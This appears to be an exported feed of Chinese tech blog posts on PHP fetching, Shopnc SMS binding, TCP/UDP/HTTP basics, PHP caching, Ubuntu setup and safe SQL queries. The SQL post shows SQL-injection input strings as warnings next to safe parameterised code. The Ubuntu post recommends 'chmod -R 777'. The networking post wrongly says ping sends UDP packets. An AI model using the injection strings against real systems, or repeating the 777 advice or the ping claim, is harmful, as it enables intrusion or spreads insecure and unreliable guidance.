<h2 id="使用-curl"><a href="#使用-curl" class="headerlink" title="使用 curl"></a>使用 curl</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = “http:<span class="comment">//www.xxx.com/”;</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">5</span>;</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="variable">$timeout</span>);<span class="comment">//在需要用户检测的网页里需要增加下面两行</span></span><br><span class="line"><span class="comment">//curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);</span></span><br><span class="line"><span class="comment">//curl_setopt($ch, CURLOPT_USERPWD, US_NAME.”:”.US_PWD);</span></span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="使用-fopen-fread-fclose"><a href="#使用-fopen-fread-fclose" class="headerlink" title="使用 fopen-&gt;fread-&gt;fclose"></a>使用 fopen-&gt;fread-&gt;fclose</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span> (“<span class="attr">http</span>://www.xxx.com/”, “rb”);</span><br><span class="line"><span class="variable">$contents</span> = “”;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="number">8192</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line"><span class="variable">$contents</span> .= <span class="variable">$data</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span> (<span class="variable">$handle</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$contents</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="file-get-contents、fopen、curl-区别分析："><a href="#file-get-contents、fopen、curl-区别分析：" class="headerlink" title="file_get_contents、fopen、curl 区别分析："></a>file_get_contents、fopen、curl 区别分析：</h2><ol>
<li><p>使用 <code>file_get_contents</code> 和 fopen 必须空间开启 <code>allow_url_fopen。</code></p>
<p> 方法：编辑 <code>php.ini</code>，设置 <code>allow_url_fopen = On</code>，<code>allow_url_fopen</code> 关闭时 fopen 和 <code>file_get_contents</code> 都不能打开远程文件。</p>
</li>
<li><p>使用 curl 必须空间开启 curl。</p>
<p> 方法：WIN 下修改 <code>php.ini</code>，将 <code>extension=php_curl.dll</code> 前面的分号去掉，而且需要拷贝 <code>ssleay32.dll</code> 和 <code>libeay32.dll</code> 到 <code>C:\WINDOWS\system32</code> 下；</p>
</li>
</ol>
<p>Linux 下要安装 curl 扩展。</p>
<p>建议打开 URL 时使用 <code>file_get_contents()</code> 方法，可优化打开速度</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>Shopnc 手机短信绑定设计研究参考</title>
    <url>/2016/10/php-shopnc/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一直以来我对短信方面的 PHP 接口代码研究不多，这里我对 Shopnc 的代码设计方面做了一下研究，解释。</p>
<span id="more"></span>

<h2 id="具体操作如下"><a href="#具体操作如下" class="headerlink" title="具体操作如下"></a>具体操作如下</h2><p>前台新用户注册后，账户安全栏的绑定手机，然后就是手机验证啦，这里需要输入你的手机号码，点击获取短信验证码。</p>
<p>JS 验证：手机号码位数必须为 11 位，不能为空</p>
<p>PHP 验证：如果手机号码为空，已经使用过，更改当前用户数据库手机号码为提交的手机号码失败时（member 表）或更改用户数据库 auth_code 为生成的六位验证码，send_acode_time 为当前时间戳失败时（member_common 表），PHP 也会返回相应的错误信息。</p>
<p>验证通过之后，把刚才生成的六位验证码，时间戳和网站名字放入一个数组中，调取手机短信验证模板，格式化这个数组，把格式化后的信息发送给提交的手机号，短信接口会判断当前系统使用的是短信宝或者云片网络，然后调取不同的方法去发送短信，根据返回的结果判断发送成功或者失败。（因为网络的不稳定性和程序的异常性，这种判断很有必要）</p>
<p>手机用户收到短信后，看到网站发送的验证码，会输入短信效验码，点击立即绑定，从而提交表单，</p>
<p>JS 验证：短信验证码，不能为空，最大长度 6，最新长度 6，必须为数字，</p>
<p>PHP 验证：手机号码和短信验证码为空，提交的验证码和数据库中存入的验证码必须不一致，当前时间戳减去数据库中验证码的添加时间大于 1800 时（30 分钟）时，更改用户数据库 auth_code 为 ‘’ 和 send_acode__time 为 0 失败时，更改会员的手机绑定状态为 1 失败时，都会返回相应的错误。</p>
<p>最后提示更改成功，返回账户安全列表，可以看到手机绑定已设置。</p>
<p>具体详细代码 <code>member_security.php</code></p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Shopnc</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP、UDP 和 HTTP 详解</title>
    <url>/2016/10/tcp-udp-http/</url>
    <content><![CDATA[<h2 id="先来一个讲-TCP、UDP-和-HTTP-关系的"><a href="#先来一个讲-TCP、UDP-和-HTTP-关系的" class="headerlink" title="先来一个讲 TCP、UDP 和 HTTP 关系的"></a>先来一个讲 TCP、UDP 和 HTTP 关系的</h2><p>http: 是用于 www 浏览的一个协议。</p>
<p>tcp：是机器之间建立连接用的到的一个协议。</p>
<span id="more"></span>

<h2 id="1、TCP-IP-是个协议组，可分为三个层次：网络层、传输层和应用层。"><a href="#1、TCP-IP-是个协议组，可分为三个层次：网络层、传输层和应用层。" class="headerlink" title="1、TCP&#x2F;IP 是个协议组，可分为三个层次：网络层、传输层和应用层。"></a>1、TCP&#x2F;IP 是个协议组，可分为三个层次：网络层、传输层和应用层。</h2><p>在网络层有 IP 协议、ICMP 协议、ARP 协议、RARP 协议和 BOOTP 协议。</p>
<p>在传输层中有 TCP 协议与 UDP 协议。</p>
<p>在应用层有 FTP、HTTP、TELNET、SMTP、DNS 等协议。</p>
<p>因此，HTTP 本身就是一个协议，是从 Web 服务器传输超文本到本地浏览器的传送协议。</p>
<h2 id="2、HTTP-协议是建立在请求-响应模型上的。"><a href="#2、HTTP-协议是建立在请求-响应模型上的。" class="headerlink" title="2、HTTP 协议是建立在请求 &#x2F; 响应模型上的。"></a>2、HTTP 协议是建立在请求 &#x2F; 响应模型上的。</h2><p>首先由客户建立一条与服务器的 TCP 链接，并发送一个请求到服务器，请求中包含请求方法、URI、协 议版本以及相关的 MIME 样式的消息。</p>
<p>服务器响应一个状态行，包含消息的协议版本、一个成功和失败码以及相关的 MIME 式样的消息。</p>
<p>HTTP&#x2F;1.0 为每一次 HTTP 的请求 &#x2F; 响应建立一条新的 TCP 链接，因此一个包含 HTML 内容和图片的页面将需要建立多次的短期的 TCP 链接。</p>
<p>一次 TCP 链接的建立将需要 3 次握手。</p>
<p>另外，为了获得适当的传输速度，则需要 TCP 花费额外的回路链接时间（RTT）。</p>
<p>每一次链接的建立需要这种经常性的开销，而其并不带有实际有用的数据，只 是保证链接的可靠性，因此 HTTP&#x2F;1.1 提出了可持续链接的实现方法。</p>
<p>HTTP&#x2F;1.1 将只建立一次 TCP 的链接而重复地使用它传输一系列的请求 &#x2F; 响应 消息，因此减少了链接建立的次数和经常性的链接开销。</p>
<h2 id="3、结论：虽然-HTTP-本身是一个协议，但其最终还是基于-TCP-的。"><a href="#3、结论：虽然-HTTP-本身是一个协议，但其最终还是基于-TCP-的。" class="headerlink" title="3、结论：虽然 HTTP 本身是一个协议，但其最终还是基于 TCP 的。"></a>3、结论：虽然 HTTP 本身是一个协议，但其最终还是基于 TCP 的。</h2><p>不过，目前，有人正在研究基于 TCP+UDP 混合的 HTTP 协议。</p>
<p>具体介绍，IP （网际协议）</p>
<p>在网络通信中，网络组件的寻址对信息的路由选择和传输来说是相当关键的。相同网络中的两台机器间的消息传输有各自的技术协定。</p>
<p>LAN 是通过提供 6 字节的唯一标识符（“MAC” 地址）在机器间发送消息的。SNA 网络中的每台机器都有一个逻辑单元及与其相应的网络地址。</p>
<p>DECNET、AppleTalk 和 Novell IPX 均有一个用来分配编号到各个本地网和工作站的配置。</p>
<p>HTTP 是超文本传输协议，是客户端浏览器或其他程序与 Web 服务器之间的 应用层通信协议。</p>
<p>在 Internet 上的 Web 服务器上存放的都是超文本信息， 客户机需要通过 HTTP 协议传输所要访问的超文本信息。</p>
<p>HTTP 包含命令和传输信息，不仅可用于 Web 访问，也可以用于其他因特网 &#x2F; 内联网应用系统之间的 通信，从而实现各类应用资源超媒体访问的集成</p>
<h2 id="TCP-（传输控制协议）"><a href="#TCP-（传输控制协议）" class="headerlink" title="TCP （传输控制协议）"></a>TCP （传输控制协议）</h2><p>通过序列化应答和必要时重发数据包，TCP 为应用程序提供了可靠的传输流和虚拟连接服务。</p>
<p>TCP 主要提供数据流转送，可靠传输，有效流控制，全双工操作和多路传输技术。可查阅 TCP 部分获取更多详细资料。</p>
<p>至于 HTTP 协议，它是 TCP 协议族中的一种。使用 TCP80 端口</p>
<p>HTTP 是应用层协议，TCP 是传输层协议！</p>
<p>数据包在网络传输过程中，HTTP 被封装在 TCP 包内！！</p>
<p>TCP&#x2F;UDP</p>
<h2 id="面向连接的-TCP"><a href="#面向连接的-TCP" class="headerlink" title="面向连接的 TCP"></a>面向连接的 TCP</h2><p>“面向连接” 就是在正式通信前必须要与对方建立起连接。比如你给别人打电话，必须等线路接通了、对方拿起话筒才能相互通话。</p>
<p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。</p>
<p>一个 TCP 连接必须要经过三次 “对话” 才能 建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。</p>
<p>我们来看看这三次对话的简单过程：</p>
<ol>
<li>主机 A 向主机 B 发出连 接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；</li>
<li>主机 B 向主机 A 发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工 作）的数据包：“可以，你什么时候发？”，这是第二次对话；</li>
<li>主机 A 再发出一个数据包确认主机 B 的要求同步：“我现在就发，你接着吧！”，这是第三次对话。</li>
</ol>
<p>三次 “对话” 的目的是使数据包的发送和接收同步，经过三次 “对话” 之后，主机 A 才向主机 B 正式发送数据。</p>
<p>TCP 协议能为应用程序提供可靠的通信连接，使一台计算机发出的字节流无差错地发往网络上的其他计算机，对可靠性要求高的数据通信系统往往使用 TCP 协议传输数据。</p>
<p>我 们来做一个实验，用计算机 A（安装 Windows 2000 Server 操作系统）从 “网上邻居” 上的一台计算机 B 拷贝大小为 8,644,608 字节的文件，通过状态栏右下角网卡的发送和接收指标就会发现：虽然是 数据流是由计算机 B 流向计算机 A，但是计算机 A 仍发送了 3,456 个数据包，如图 2 所示。这些数据包是怎样产生的呢？因为文件传输时使用了 TCP&#x2F;IP 协 议，更确切地说是使用了面向连接的 TCP 协议，计算机 A 接收数据包的时候，要向计算机 B 回发数据包，所以也产生了一些通信量。</p>
<p>如果事先用网络监视器监视网络流量，就会发现由此产生的数据流量是 9,478,819 字节，比文件大小多出 10.96%（如图 3 所示），原因不仅在于数据包和帧本身占用了一些空间，而且也在于 TCP 协议面向连接的特性导致了一些额外的通信量的产生。</p>
<h2 id="面向非连接的-UDP-协议"><a href="#面向非连接的-UDP-协议" class="headerlink" title="面向非连接的 UDP 协议"></a>面向非连接的 UDP 协议</h2><p>“面向非连接” 就是在正式通信前不必与对方先建立连接，不管对方状态就直接发送。这与现在风行的手机短信非常相似：你在发短信的时候，只需要输入对方手机号就 OK 了。</p>
<p>UDP（User Data Protocol，用户数据报协议）是与 TCP 相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！</p>
<p>UDP 适用于一次只传送少量数据、对可靠性要求不高的应用环境。比如，我们经常使用 “ping” 命令来测试两台主机之间 TCP&#x2F;IP 通信是否正常，其实 “ping” 命令的原理就是向对方主机发送 UDP 数据包，然后对方主机确认收到数据包，如果数据包是否到达的消息及时反馈回来，那么网络就是通的。</p>
<p>例如， 在默认状态下，一次 “ping” 操作发送 4 个数据包（如图 2 所示）。大家可以看到，发送的数据包数量是 4 包，收到的也是 4 包（因为对方主机收到后会发回一 个确认收到的数据包）。这充分说明了 UDP 协议是面向非连接的协议，没有建立连接的过程。</p>
<p>正因为 UDP 协议没有连接的过程，所以它的通信效果高；但也正因 为如此，它的可靠性不如 TCP 协议高。QQ 就使用 UDP 发消息，因此有时会出现收不到消息的情况。</p>
<h2 id="附表：tcp-协议和-udp-协议的差别"><a href="#附表：tcp-协议和-udp-协议的差别" class="headerlink" title="附表：tcp 协议和 udp 协议的差别"></a>附表：tcp 协议和 udp 协议的差别</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tcp</span> udp</span><br><span class="line">是否连接 面向连接 面向非连接</span><br><span class="line">传输可靠性 可靠的 不可靠的</span><br><span class="line">应用场合 传输大量的数据 少量数据</span><br><span class="line">速度 慢 快</span><br><span class="line">TCP 协议和 UDP 协议各有所长、各有所短，适用于不同要求的通信环境。TCP 协议和 UDP 协议之间的差别如附表所示。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>TCP</tag>
        <tag>UDP</tag>
      </tags>
  </entry>
  <entry>
    <title>PECL 和 PEAR 有什么区别？</title>
    <url>/2016/11/pecl-pear/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PECL 和 PEAR 都是 Php 相关的代码应用，他们之间有什么区别呢？</p>
<p>这篇文章要为大家分享的内容是 PECL 和 PEAR 他们之间的不同和相同之处。</p>
<span id="more"></span>

<h2 id="PEAR"><a href="#PEAR" class="headerlink" title="PEAR"></a>PEAR</h2><p>PEAR 是 “PHP Extension and Application Repository” 的缩写，即 PHP 扩展和应用仓库。</p>
<p>PEAR 将 PHP 程序开发过程中常用的功能编写成类库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复发明 “车轮”。PEAR 的出现大大提高了 PHP 程序的开发效率和开发质量。</p>
<h2 id="PECL"><a href="#PECL" class="headerlink" title="PECL"></a>PECL</h2><p>PECL 是 “PHP Extension Community Library” 的缩写，即 PHP 扩展库。</p>
<p>PECL 可以看作 PEAR 的一个组成部分，提供了与 PEAR 类似的功能。不同的是 PEAR 的所有扩展都是用纯粹的 PHP 代码编写的，用户在下载到 PEAR 扩展以后可以直接使用将扩展的代码包含到自己的 PHP 文件中使用。而 PECL 是使用 C 语言开发的，通常用于补充一些用 PHP 难以完成的底层功能，往往需要重新编译或者在配置文件中设置后才能在用户自己的代码中使用。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php 学习总结：最直接的表述：PEAR 是 PHP 的上层扩展，PECL 是 PHP 的底层扩展。它们都是为特定的应用提供现成的函数或者类。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PECL</tag>
        <tag>PEAR</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 缓存技术</title>
    <url>/2016/11/php-cache/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PHP 缓存包括 PHP 编译缓存和 PHP 数据缓存两种。PHP 是一种解释型语言，属于边编译边运行的那种。</p>
<p>这种运行模式的优点是程序修改很方便，但是运行效率却很低下。</p>
<span id="more"></span>

<p>PHP 编译缓存针对这种情况做改进处理，使得 PHP 语言只要运行一次，就可以把程序的编译结果缓存起来。</p>
<p>这样，接下来的每次运行都不需要再次编译了，这大大提高 PHP 运行速度。</p>
<p>PHP 数据缓存运用于 PHP 实际开发之中针对数据处理进行缓存，主要两大方向为：针对数据库数据进行缓存和针对 PHP 模板数据进行缓存。</p>
<h2 id="PHP-编译缓存"><a href="#PHP-编译缓存" class="headerlink" title="PHP 编译缓存"></a>PHP 编译缓存</h2><p>目前最常见的 PHP 编译缓存工具有：APC，Accelerator，xcache（国产）等。</p>
<h2 id="PHP-数据缓存"><a href="#PHP-数据缓存" class="headerlink" title="PHP 数据缓存"></a>PHP 数据缓存</h2><p>PHP 的数据缓存包括针对数据库数据进行缓存和针对 PHP 模板数据进行缓存。</p>
<p>针对数据库数据进行缓存的工具有 memcache 等。</p>
<p>针对 PHP 模板数据进行缓存的工具主要有 smarty 等。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>alpha、beta、rc 各版本区别</title>
    <url>/2016/11/software-version/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>很多软件在正式发布前都会发布一些预览版或者测试版，一般都叫 “beta 版” 或者 “rc 版”。</p>
<p>特别是开源软件，甚至有 “alpha 版”，下面来解释一下各个版本的意思。</p>
<span id="more"></span>

<p>alpha 版：内部测试版。α 是希腊字母的第一个，表示最早的版本，一般用户不要下载这个版本，这个版本包含很多 BUG，功能也不全，主要是给开发人员和 测试人员测试和找 BUG 用的。</p>
<p>beta 版：公开测试版。β 是希腊字母的第二个，顾名思义，这个版本比 alpha 版发布得晚一些，主要是给 “部落” 用户和忠实用户测试用的，该版本任然存 在很多 BUG，但是相对 alpha 版要稳定一些。这个阶段版本的软件还会不断增加新功能。如果你是发烧友，可以下载这个版本。</p>
<p>rc 版：全写：Release Candidate（候选版本），该版本又较 beta 版更进一步了，该版本功能不再增加，和最终发布版功能一样。这个版本有点像最终发行版之前的一个类似 预览版，这个的发布就标明离最终发行版不远了。作为普通用户，如果你很急着用这个软件的话，也可以下载这个版本。</p>
<p>stable 版：稳定版。在开源软件中，都有 stable 版，这个就是开源软件的最终发行版，用户可以放心大胆的用了。</p>
<h2 id="商业软件"><a href="#商业软件" class="headerlink" title="商业软件"></a>商业软件</h2><p>RTM 版：全称为 Release to Manufacture。工厂版。改版程序已经固定，就差工厂包装、光盘印图案等工作了。</p>
<p>OEM 版：厂商定制版。</p>
<p>EVAL 版：评估版。就是有 30 或者 60 天等使用期限的版本。</p>
<p>RTL 版：Retail.(零售版)，这个版本就是真正发售的版本，有漂亮的包装、光盘、说明书等东西和高昂的价格。</p>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu 使用经验</title>
    <url>/2016/12/ubuntu-excripse/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这是我在 Ubuntu 上写的第一篇博客，折腾两三个星期的时间，总结出来一点经验，喜欢的朋友支持下。</p>
<ol>
<li>首先使用软碟通刻录 Ubuntu U 盘启动盘。</li>
</ol>
<span id="more"></span>

<p><span class="exturl" data-url="aHR0cDovL2ppbmd5YW4uYmFpZHUuY29tL2FydGljbGUvMTkwMjBhMGEzOTZiNmU1MjlkMjg0MmNiLmh0bWw=">http://jingyan.baidu.com/article/19020a0a396b6e529d2842cb.html<i class="fa fa-external-link-alt"></i></span></p>
<ol start="2">
<li><p>刻录成功，插入 U 盘，进入 BIOS ，选择 U 盘启动，如果启动出现问题就输入 live。</p>
</li>
<li><p>紧接着进入 Ubuntu 安装界面 具体安装双系统还是单系统看自己选择。</p>
</li>
</ol>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5saW51eGlkYy5jb20vTGludXgvMjAxNi0wNC8xMzA1MjAuaHRt">http://www.linuxidc.com/Linux/2016-04/130520.htm<i class="fa fa-external-link-alt"></i></span></p>
<ol start="4">
<li>安装成功，紧接着快速安装 PHP  环境。</li>
</ol>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ2MjQxNjA0L2Fuc3dlci8xMDA3ODg3ODk=">https://www.zhihu.com/question/46241604/answer/100788789<i class="fa fa-external-link-alt"></i></span></p>
<p>MySql 开发可以使用 Navicate ，Mysqldump，PHPMyadmin ，Mysql  命令行也可以，如果 PHPMyadmin 无法使用你可以</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> apt install php7.<span class="number">0</span>-mbstring</span><br></pre></td></tr></table></figure>

<p>PHP 开发可以使用 Netbeans for PHP, PHPStorm, ZendStudio, Sublime, 自己定制的 VIM, IDE 也可以，如果 IDE。</p>
<ol start="5">
<li><p>没有权限编辑文件是因为 Nginx 默认用户是 www-data , 当前用户是你登录的用户，所以没有权限你可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> -R your-user:your-group www</span></span><br><span class="line">// 或者</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> -R 777 www .</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>线上环境时我都是让登录名字跟随 nginx 用户的组 然后修改 771，就可以更改项目文件啦。</p>
</li>
</ol>
<p>Ububtu 更改所在组也不能修改项目，所以直接把根目录权限修改成登录用户的名字和组或者修改成 777。</p>
<ol start="7">
<li>本地项目开发好就可以使用 Ubuntu 上的连接到服务器 <code>sftp://user@www.example.com:22222/home/wwwroot</code> 像访问本地文件一样访问服务器。</li>
</ol>
<p>当然你输入正确的用户名和密码才能上传和下载文件。</p>
<p>成功链接服务器后，你可以右键选择在远程终端打开，就可以在远程服务器上使用 shell 命令啦。 </p>
<ol start="8">
<li>Ubuntu 16.04 没有声音如何修复：</li>
</ol>
<p><span class="exturl" data-url="aHR0cHM6Ly9sbXMuaW0vb3Mvbm8tc291bmQtc29sdXRpb24tdWJ1bnR1LTE2LTA0Lmh0bWw=">https://lms.im/os/no-sound-solution-ubuntu-16-04.html<i class="fa fa-external-link-alt"></i></span></p>
<ol start="9">
<li>Ubuntu 16.04 中 Sublime 无法输入中文如何修复：</li>
</ol>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5qaWFuc2h1LmNvbS9wL2JmMDVmYjNhNDcwOQ==">http://www.jianshu.com/p/bf05fb3a4709<i class="fa fa-external-link-alt"></i></span></p>
<p>附录：虽然我为系统，环境，工具付出很多心血，但老板要的是快速，安全，稳定，专业的项目，而不是各种各种的酷工具，不说啦，鲁代码去啦。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 语句的正确姿势</title>
    <url>/2016/12/mysql-syntax/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>书写 MySQL 的正确姿势，使用参数化查询。</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 不安全的写法举例 1</span></span><br><span class="line"> <span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]=<span class="number">8</span>;<span class="comment">// 希望得到的是正整数</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span>(<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"> <span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]=<span class="string">&#x27;8 or status=1&#x27;</span>;<span class="comment">// 隐患：构造畸形查询条件进行注入；</span></span><br><span class="line">           </span><br><span class="line"> <span class="comment">// 安全的替换写法</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="keyword">array</span> (<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span> ();<span class="comment">// 使用数组方式将自动使用框架自带的字段类型检测防止注入</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="keyword">array</span> (<span class="string">&#x27;id&#x27;</span>=&gt;(<span class="keyword">int</span>)<span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span> ();<span class="comment">// 类型约束</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="string">&#x27;id=&#x27;</span>.<span class="title function_ invoke__">intval</span> (<span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span> ();<span class="comment">// 类型转换</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="keyword">array</span> (<span class="string">&#x27;id&#x27;</span>=&gt;<span class="title function_ invoke__">I</span> (<span class="string">&#x27;get.id&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;intval&#x27;</span>)))-&gt;<span class="title function_ invoke__">find</span> ();<span class="comment">// 本人习惯写法</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="keyword">array</span> (<span class="string">&#x27;id&#x27;</span>=&gt;<span class="string">&#x27;:id&#x27;</span>))-&gt;<span class="title function_ invoke__">bind</span> (<span class="string">&#x27;:id&#x27;</span>,<span class="title function_ invoke__">I</span> (<span class="string">&#x27;get.id&#x27;</span>))-&gt;<span class="title function_ invoke__">select</span> ();<span class="comment">//PDO 驱动可以使用参数绑定</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> (<span class="string">&#x27;Member&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span> (<span class="string">&quot;id=% d&quot;</span>,<span class="keyword">array</span> (<span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span> ();<span class="comment">// 预处理机制</span></span><br><span class="line">           </span><br><span class="line"> <span class="comment">// 不安全的写法举例 2</span></span><br><span class="line"> <span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]=<span class="number">8</span>;<span class="comment">// 希望得到的是正整数</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="title function_ invoke__">M</span> ()-&gt;<span class="title function_ invoke__">query</span> (<span class="string">&#x27;SELECT * FROM `member` WHERE  id=&#x27;</span>.<span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]);<span class="comment">// 执行的 SQL 语句</span></span><br><span class="line"> <span class="variable">$_GET</span> [<span class="string">&#x27;id&#x27;</span>]=<span class="string">&#x27;8  UNION SELECT * FROM `member`&#x27;</span>;;<span class="comment">// 隐患：构造畸形语句进行注入；</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Golang 实现缓存系统</title>
    <url>/2020/08/golang-cache/</url>
    <content><![CDATA[<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>缓存（Cache）在计算机硬件中普遍存在。比如在 CPU 中就有一级缓存，二级缓存，甚至三级缓存。缓存的工作原理一般是 CPU 需要读取数据时，会首先从缓存中查找需要的数据，如果找到了就直接进行处理，如果没有找到则从内存中读取数据。由于 CPU 中的缓存工作速度比内存还要快，所以缓存的使用能加快 CPU 处理速度。缓存不仅仅存在于硬件中，在各种软件系统中也处处可见。比如在 Web 系统中，缓存存在于服务器端，客户端或者代理服务器中。广泛使用的 CDN 网络，也可以看作一个巨大的缓存系统。缓存在 Web 系统中的使用有很多好处，不仅可以减少网络流量，降低客户访问延迟，还可以减轻服务器负载。</p>
<span id="more"></span>

<p>目前已经存在很多高性能的缓存系统，比如 Memcache，Redis 等，尤其是 Redis，现已经广泛用于各种 Web 服务中。既然有了这些功能完善的缓存系统，那为什么我们还需要自己实现一个缓存系统呢？这么做主要有两个原因，第一，通过动手实现我们可以了解缓存系统的工作原理，这也是老掉牙的理由了。第二，Redis 之类的缓存系统都是独立存在的，如果只是开发一个简单的应用还需要单独使用 Redis 服务器，难免会过于复杂。这时候如果有一个功能完善的软件包实现了这些功能，只需要引入这个软件包就能实现缓存功能，而不需要单独使用 Redis 服务器，就最好不过了。</p>
